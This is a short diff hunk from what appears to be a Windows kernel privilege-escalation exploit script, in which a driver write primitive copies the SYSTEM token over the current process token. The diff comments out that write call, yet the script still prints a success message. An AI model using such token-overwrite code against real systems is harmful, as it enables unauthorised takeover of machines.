@@ -403,7 +403,7 @@ def executeOverwrite():
             # Write the system_token over our current_token for SYSTEM privileges.
             print "MAIN Attempting system to current token overwrite!"
 
-            success = writePrimitive(driver, system_token, current_token, system_token)
+            #success = writePrimitive(driver, system_token, current_token, system_token)
 
         print "MAIN Success!"
 ############################################ RUN ################################################
